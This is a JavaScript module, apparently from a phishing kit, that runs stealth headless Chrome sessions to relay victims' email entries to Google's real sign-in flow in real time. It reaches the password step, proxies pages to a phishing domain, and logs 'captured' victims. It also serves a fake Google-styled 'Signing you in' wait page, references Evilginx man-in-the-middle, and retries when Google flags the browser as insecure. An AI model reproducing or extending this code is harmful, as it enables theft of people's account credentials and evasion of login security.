import { createBrowserSession } from './browser-session.js';
import { pathStage } from './navigation.js';

const sessions = new Map();
const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

export async function getOrCreateSession(sessionKey, config) {
  let entry = sessions.get(sessionKey);
  if (entry) {
    await entry.initPromise;
    return entry;
  }

  // Reuse warm Chromium so Next is not blocked on cold launch
  const warm = sessions.get('__warm__');
  if (warm && sessionKey !== '__warm__' && warm.session) {
    sessions.delete('__warm__');
    warm.key = sessionKey;
    sessions.set(sessionKey, warm);
    console.log(`[puppet-bridge] reclaim warm Chrome → session ${String(sessionKey).slice(0, 8)}`);
    await warm.initPromise;
    return warm;
  }

  entry = {
    key: sessionKey,
    config,
    session: null,
    initPromise: null,
    emailSubmitted: false,
    submitPromise: null,
    lastEmail: '',
    lastPath: '',
    renderChain: Promise.resolve(),
  };

  entry.initPromise = (async () => {
    console.log('[puppet-bridge] Launching Chrome browser…');
    entry.session = await createBrowserSession(config, {
      clientIp: sessionKey,
      onCaptured: (data) => {
        console.log(`[puppet-bridge] captured ${data.email || ''} (session ${String(sessionKey).slice(0, 8)})`);
      },
    });
    await entry.session.gotoTarget();
    console.log('[puppet-bridge] Ready on identifier page');
  })();

  sessions.set(sessionKey, entry);
  await entry.initPromise;
  return entry;
}

/** Kick email→password without blocking the HTTP response (avoids Next hang). */
export function kickPuppetUsername(sessionKey, config, username) {
  if (!EMAIL_RE.test(username || '')) {
    return { ok: false, accepted: false, passwordReady: false };
  }
  // Do not await — victim Next must navigate immediately
  (async () => {
    try {
      const entry = await getOrCreateSession(sessionKey, config);
      await entry.initPromise;
      entry.lastEmail = username;
      await submitEmailOnce(entry, username);
      console.log(`[puppet-bridge] kick username done ready=${await entry.session.isPasswordStep()}`);
    } catch (e) {
      console.error('[puppet-bridge] kick username:', e.message);
    }
  })();
  return { ok: true, accepted: true, passwordReady: false };
}

async function recreatePlaywright(entry) {
  console.warn(`[puppet-bridge] Recreating stealth Chrome for ${entry.key.slice(0, 8)}`);
  try { entry.session?.close(); } catch { /* */ }
  entry.emailSubmitted = false;
  entry.submitPromise = null;
  entry.session = await createBrowserSession(entry.config, {
    clientIp: entry.key,
    onCaptured: (data) => {
      console.log(`[puppet-bridge] captured ${data.email || ''} (session ${entry.key.slice(0, 8)})`);
    },
  });
  await entry.session.gotoTarget();
}

async function submitEmailOnce(entry, username, { allowRecreate = true } = {}) {
  if (!EMAIL_RE.test(username)) return false;
  if (entry.emailSubmitted && entry.lastEmail === username) {
    if (await entry.session.isPasswordStep()) return true;
  }
  if (entry.submitPromise) {
    await entry.submitPromise.catch(() => {});
    if (entry.emailSubmitted && entry.lastEmail === username && await entry.session.isPasswordStep()) {
      return true;
    }
  }

  entry.submitPromise = (async () => {
    console.log(`[puppet-bridge] Stage 1→2: Playwright submit email (${username}) session ${entry.key.slice(0, 8)}`);
    await entry.session.submitEmail(username);
    entry.emailSubmitted = true;
    entry.lastEmail = username;
  })();

  try {
    await entry.submitPromise;
    if (await entry.session.isPasswordStep()) return true;
  } catch (e) {
    console.error('[puppet-bridge] submitEmail failed:', e.message);
    entry.emailSubmitted = false;
    if (allowRecreate && /secure|blocked|may not be secure|Password field/i.test(e.message)) {
      try {
        await recreatePlaywright(entry);
        return submitEmailOnce(entry, username, { allowRecreate: false });
      } catch (e2) {
        console.error('[puppet-bridge] recreate+retry failed:', e2.message);
      }
    }
    return false;
  } finally {
    entry.submitPromise = null;
  }
  return await entry.session.isPasswordStep();
}

function waitingChallengeHtml(refreshUrl) {
  const url = String(refreshUrl || '/v3/signin/challenge/pwd').replace(/"/g, '');
  return `<!DOCTYPE html><html><head><meta charset="utf-8">
<meta http-equiv="refresh" content="2;url=${url}">
<title>Signing in…</title>
<style>body{font-family:Roboto,Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;background:#fff;color:#202124}
.box{text-align:center} .spin{width:36px;height:36px;border:3px solid #e8eaed;border-top-color:#1a73e8;border-radius:50%;margin:0 auto 16px;animation:s 0.8s linear infinite}
@keyframes s{to{transform:rotate(360deg)}}</style></head>
<body><div class="box"><div class="spin"></div><div>Signing you in…</div>
<p style="color:#5f6368;font-size:14px">Please wait</p></div>
<script>setTimeout(function(){location.replace(${JSON.stringify(url)});},2000);</script>
</body></html>`;
}

async function syncPlaywrightToPath(entry, { path, query, username }) {
  const stage = pathStage(path);
  entry.lastPath = path;

  if (stage === 1) {
    await entry.session.ensureIdentifierPage();
    return;
  }

  if (stage === 2) {
    if (await entry.session.isPasswordStep()) {
      console.log(`[puppet-bridge] Sync stage 2: already on password page (${path})`);
      return;
    }
    const user = username || entry.lastEmail;
    if (EMAIL_RE.test(user)) {
      await submitEmailOnce(entry, user);
      // Poll — do NOT fall back to Evilginx MITM (engine cannot complete Google Next)
      const deadline = Date.now() + 45_000;
      while (Date.now() < deadline) {
        if (await entry.session.isPasswordStep()) return;
        await entry.session.page.waitForTimeout(400).catch(() => {});
      }
      return;
    }
    console.warn('[puppet-bridge] Stage 2 without username — wait for /mirror/capture');
  }
}

export async function renderPuppetPage(sessionKey, config, {
  phishHost,
  path = '/',
  query = '',
  username = '',
} = {}) {
  const entry = await getOrCreateSession(sessionKey, config);

  const task = async () => {
    await entry.initPromise;
    const stage = pathStage(path);
    console.log(`[puppet-bridge] Render sync: ${path}${query ? `?${query}` : ''} stage=${stage} user=${username ? 'yes' : 'no'}`);
    await syncPlaywrightToPath(entry, { path, query, username });

    if (stage === 2) {
      if (!(await entry.session.isPasswordStep())) {
        // Never throw → Evilginx MITM would serve /signin/rejected
        const refresh = path + (query ? `?${query}` : '');
        console.warn('[puppet-bridge] password not ready — returning wait HTML (no MITM)');
        return {
          status: 200,
          contentType: 'text/html; charset=utf-8',
          body: waitingChallengeHtml(refresh || '/v3/signin/challenge/pwd'),
          location: '',
          cookies: [],
        };
      }
    }

    return entry.session.getPageForProxy(config.phishDomain, {
      path,
      query,
      phishHost,
      stage,
    });
  };

  entry.renderChain = entry.renderChain.then(task, task);
  return entry.renderChain;
}

export async function notifyPuppetUsername(sessionKey, config, username) {
  if (!EMAIL_RE.test(username || '')) return { ok: false, passwordReady: false };
  const entry = await getOrCreateSession(sessionKey, config);
  await entry.initPromise;
  if (entry.emailSubmitted && entry.lastEmail === username && await entry.session.isPasswordStep()) {
    return { ok: true, passwordReady: true };
  }
  const ok = await submitEmailOnce(entry, username);
  return { ok: true, passwordReady: !!ok };
}

/** Optional capture hook used by Desktop server.js — safe no-op for Google. */
export async function reportVictimCapture() {
  return { ok: true };
}

export function closeSession(sessionKey) {
  const entry = sessions.get(sessionKey);
  if (!entry) return;
  entry.session?.close();
  sessions.delete(sessionKey);
}

/** Pre-launch Chrome so the first victim render is not cold. */
export function warmAssistBrowser(config) {
  const key = '__warm__';
  getOrCreateSession(key, config)
    .then(() => console.log('[puppet-bridge] warm session ready (off-screen Chrome)'))
    .catch((e) => console.warn('[puppet-bridge] warm failed:', e.message));
}
